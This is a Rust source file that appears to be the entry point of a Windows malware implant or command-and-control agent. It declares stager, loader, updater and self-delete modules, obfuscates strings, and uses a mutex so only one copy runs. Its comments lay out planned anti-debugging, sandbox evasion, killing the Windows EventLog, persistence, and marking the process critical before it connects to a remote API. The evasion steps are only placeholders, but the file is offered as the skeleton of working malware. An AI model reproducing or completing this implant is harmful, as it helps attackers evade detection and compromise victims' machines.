pub mod sys;
pub mod loaders;
pub mod namoracore;
pub mod stager;
mod error;
mod config;
mod init;
mod run;
mod updater;
mod self_delete;

use winapi::um::synchapi::CreateMutexA;
use winapi::um::winbase::WAIT_OBJECT_0;
use std::time::Duration;
//use crate::namoracore::novacore::muddy_internal;
use crate::namoracore::ntapi::wait_for_single_object;

use obfstr::obfstr as m;
use env_logger::Env;
use log::LevelFilter;



fn main() -> Result<(), Box<dyn std::error::Error>> {

    env_logger::Builder::from_env(Env::default().default_filter_or("debug")).init();


    #[cfg(target_os = "windows")]
    {
        
        //checks for  if being debugged go here...


        //check if running in a VM/sandbox...


        //if elevated, attempt to kill EventLog


        //create a mutex to ensure that only one instance of the agent is running
        let g_nomutex: bool = false;

        if !g_nomutex {
            unsafe {
                let hmutex = CreateMutexA(
                    std::ptr::null_mut(),
                    1,//true
                    m!("hsfjuukjzloqu28oajh727190").as_ptr() as *const i8,
                );

                if hmutex.is_null() {
                    return Err(Box::new(std::io::Error::last_os_error()));

                }

                if wait_for_single_object(hmutex, 0) != WAIT_OBJECT_0 {
                    std::process::exit(1); //exit if mutex already exists

                }
            }
        }

        //a persistence mechanism to ensure that the agent is always running


        //set process as critical to prevent termination


        //proceed with the agent
        let api_client = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(10))
            .user_agent("agent/0.1")
            .build();

        let conf = init::init(&api_client)?;
        run::run(&api_client, conf);
    }
}
  

